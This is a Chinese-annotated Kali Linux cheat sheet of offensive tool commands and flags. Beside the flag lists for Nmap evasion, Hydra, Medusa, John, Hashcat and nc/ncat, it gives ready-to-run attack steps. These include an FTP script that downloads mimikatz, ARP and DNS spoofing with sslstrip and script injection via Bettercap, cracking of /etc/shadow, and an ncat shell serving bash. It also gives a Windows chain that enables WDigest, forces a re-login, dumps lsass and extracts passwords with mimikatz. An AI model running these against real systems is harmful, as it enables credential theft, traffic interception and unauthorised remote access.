# Kali

## Update

```
apt-get update                  //更新软件包列表库
apt-get install kali-linux-all  //安装所有kali工具包
apt-get upgrade                 //更新安装的软件包
apt-get dist-upgrade            //根据依赖关系更新
apt-get clean                   //清除缓存索引
reboot                          //重启电脑
```

## SSH

```
service ssh start/restart/stop        #开启/重启/停止ssh服务
update-rc.d ssh enable/disabled       #开启/关闭ssh服务开机自启动
/etc/ssh/sshd_config                  #配置SSH
---------------------------------------------
PasswordAuthentication yes
permitrootlogin yes
---------------------------------------------
-b <ip>                               #使用本机指定地址作为源地址
-C                                    #进行数据压缩
-f                                    #后台执行ssh服务
-i <mi>                               #指定认证所需的私钥文件
-g                                    #允许远端主机连接本地转发的端口
-N                                    #不执行远程命令
-p <port>                             #指定远程主机的端口
-X                                    #开启X11转发功能
-x                                    #关闭X11转发功能
-L <lport:rhost:rport>                #将本地的某个端口转发到远端机器的指定端口
-R <rport:lhost:lport>                #将远程主机的某个端口转发到本地的指定端口
-D <lport>                            #指定本地机器"动态的"应用程序端口转发
```

## FTP

```
service vsftpd start/restart/stop     #开启/重启/停止ftp服务
/home/ftp                             #文件存放路径
------------------------------------
echo open 192.168.253.139 21>ftp.txt
echo ftp>>ftp.txt
echo 123456>>ftp.txt
echo bin>>ftp.txt
echo get mimikatz.exe>>ftp.txt
echo bye>>ftp.txt
------------------------------------
ftp -s:ftp.txt
```

## ARP

```
echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
driftnet -i eth0                                  //图片嗅探
```

## Apache

```
service apache2 start/restart/stop    #开启/重启/停止Apache服务
/var/www/html                         #网站存放路径
```

## Nmap

- 主机发现:

```
-sn                             //仅进行ping扫描,不进行端口扫描
-Pn                             //跳过目标存活判断,直接进行进一步的探测
-PS/PA/PU/PY[portlist]          //使用TCP SYN/ACK,UDP,SCTP INIT方式进行发现
-n/-R                           //-n表示不进行DNS解析,-R表示总是进行DNS解析
--dns-servers <serv>            //指定DNS服务器
--system-dns                    //指定使用系统的DNS服务器
```

- 端口扫描

```
-p <port>                       //只扫描指定的端口
-F                              //快速扫描
-sS/sT/sA/sW/sM                 //使用TCP SYN/Connect()/ACK/Window/Maimon 扫描方式
-sU                             //使用UDP扫描方式确定目标主机的UDP端口状况
-sN/sF/sX                       //使用TCP Null/FIN/Xmas秘密扫描方式来协助探测对方的TCP端口状态
-sI <idle:port>                 //使用idle scan方式来扫描目标主机
```

- 版本侦测

```
-sV                              //服务版本探测
--version-intensity <level>      //指定版本侦测强度(0-9),默认为7
--version-trace                  //显示出详细的版本侦测过程信息
```

- 操作系统侦测

```
-O                               //启用操作系统检测
-A                               //同时启用操作系统检测和版本扫描
--osscan-guess/fuzzy             //推测操作系统检测结果
```

- 防火墙/IDS 规避

```
-f/--mtu <val>                   //指定使用分片、指定数据包的MTU
-D <ip1,ip2,...,ME>              //用一组IP地址掩盖真实地址,ME代表本机IP地址
-S <IP>                          //伪装成其他IP地址
-g/--source-port <port>          //使用指定源端口
--data-length <num>              //填充随机数据让数据包长度达到Num
--ttl <time>                     //设置time-to-live时间
```

## Nessus

```
service nessusd start/stop          #开启/停止Nessus
https://192.168.253.139:8834/       #网站地址(可变)
```

## Hydra

> hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机地址 指定服务 <br>
> hydra -l 用户名 -P 密码字典 -t 2 -e ns -vV 主机地址 http-form-post "/login.php:username=^USER^&password=^PASS^:S=login.php"

```
-R                            //继续从上一次进度开始
-l                            //指定用户名
-L                            //指定用户名字典
-p                            //指定密码
-P                            //指定密码字典
-x min:max:charset            //密码暴力生成("-x -h"获取更多帮助)
-e [n/s/ns]                   //空密码和密码=用户名
-u                            //循环用户,而不是密码(-x同样有效)
-o [file]                     //输出成文件
-t [num]                      //同时运行的线程数,默认16
-w [time]                     //设置最大超时的时间,默认30s
-vV                           //显示详细过程
-S                            //采用SSL链接
-s [port]                     //指定非默认端口
```

## Medusa

> medusa -h 主机 IP -u 用户名 -P 字典 -e ns -f -M service 服务

```
-h                              //目标主机名或IP地址
-H [file]                       //包含目标主机名或IP地址的文件
-u                              //指定用户名
-U [file]                       //指定用户名字典
-p                              //指定密码
-P [file]                       //指定密码字典
-e [n/s/ns]                     //空密码和密码=用户名
-M                              //要执行的模块
-L                              //每个线程使用一个用户名并行登录
-t [num]                        //要同时测试的登录总数
-T [num]                        //要同时测试的主机总数
-f                              //发现第一个有效的用户名/密码后停止
-F                              //在任何主机上找到第一个有效的用户名/密码后停止
-n [num]                        //使用非默认的TCP端口号
-s                              //启用SSL
-O [file]                       //输出成文件
-v <0-6>                        //显示详细信息
```

## John

> unshadow /etc/passwd /etc/shadow > passwd.txt
> john --wordlist=/usr/share/john/password.lst passwd.txt

```
--single[=section[,..]]             //single crack模式,使用默认或命名规则
--wordlist[=file] --stdin           //单词列表模式,从文件或标准输出中读取单词
                  --pipe            //和--stdin一样,批量读取,并允许使用规则
--loopback[=file]                   //类似于--wordlist，但从.pot文件中提取单词
--rules[=section[,..]]              //启用单词处理规则,使用默认规则或命名规则
--incremental[=mode]                //"增量"模式[使用部分模式]
--mask[=mask]                       //使用掩码模式(或john.conf中的默认设置)
--external=mode                     //外部模式或字过滤器
--restore[=name]                    //恢复中断的会话[名为name]
--session=name                      //进行新的会话"name"
--show                              //显示破解的密码
--format=name                       //强制输入name类型的哈希

```

## Hashcat

> hashcat -a 0/1/3 -m typeID 字段/文件 字典/暴力 ...

```
-a <0/1/2>                      //指定要使用的破解模式,[0-字典攻击,1-组合攻击,3-掩码攻击]
-m <id>                         //指定要破解的hash类型ID,如果不指定类型默认为MD5
-i  --increment                 //启用增量破解模式
    --increment-min             //密码最小长度
    --increment-max             //密码最大长度
-o  --outfile                   //将破解成功的hash输出在指定目录的文件中    
    --outfile-format            //指定破解结果的输出格式ID,默认3
--force                         //忽略警告信息
--show                          //显示已经破解的hash及该hash所对应的明文
```

## Bettercap

> 开启本地(远程)的 WebUI -------→ bettercap -caplet http(s)-ui

```
net.show          //展示网络情况
net.probe         //主动探测
arp.spoof         //ARP欺骗
http.proxy        //http代理
net.sniff         //开启嗅探
dns.spoof         //DNS欺骗
---------------------------------------------------------------
set arp.spoof.targets 192.168.1.1         //设置欺骗的IP目标
set http.proxy.sslstrip true              //将HTTPS降级到HTTP
set http.proxy.script /root/xss.js        //代理执行的脚本
set net.sniff.verbose false               //精简化显示数据
set dns.spoof.domains google.com          //设置要欺骗的域名
set dns.spoof.address desired_IP          //设置要重定向的地址
set dns.spoof.all true                    //回应任何请求(默认只会回应那些对本地的请求)
```

## Metasploit

```

```

## Great Tools

- nc

```
-h     //显示帮助选项
-l     //绑定并监听传入连接
-p     //指定要使用的端口
-c     //通过/bin/sh 执行给定的命令
-e     //连接后执行程序
-q     //执行完毕X秒后退出
-n     //数字ip,不通过DNS解析
-v     //显示详细信息
-u     //使用UDP模式
-z     //使用扫描模式
------------------------------------
A：nc -lp 端口 | 解密方式 > 文件
B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
```

- ncat

```
--allow         //只允许给定的主机连接到 ncat
--ssl           //使用 SSL 连接或监听
--keep-open     //在断开连接时保持侦听打开
-------------------------------------
A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
B：ncat -nv IP 地址 端口 --ssl
```

## Web Tools

- dirb 目录扫描工具

```
    dirb <url_base> [<wordlist_file(s)>][options]
---------------------------------------------------------
-c <cookie_string>                //设置HTTP请求的cookie
-H <header_string>                //向HTTP请求添加自定义头
-i                                //使用不区分大小写的搜索
-o <output_file>                  //将输出保存到磁盘
-p <proxy[:port]>                 //使用这个代理(默认端口为1080)
-P <username:password>            //代理身份验证
-r                                //不递归搜索
-R                                //交互式递归(询问每个目录)
-u <username:password>            //HTTP身份验证
-z <s>                            //添加一个毫秒的延迟,以避免造成过多的溢出
```

## Window-collect

- laZagne
- mimikatz

```
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
-------------------------------------------------------------------------------------
#修改注册表开启/关闭Wdigest Auth
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
```
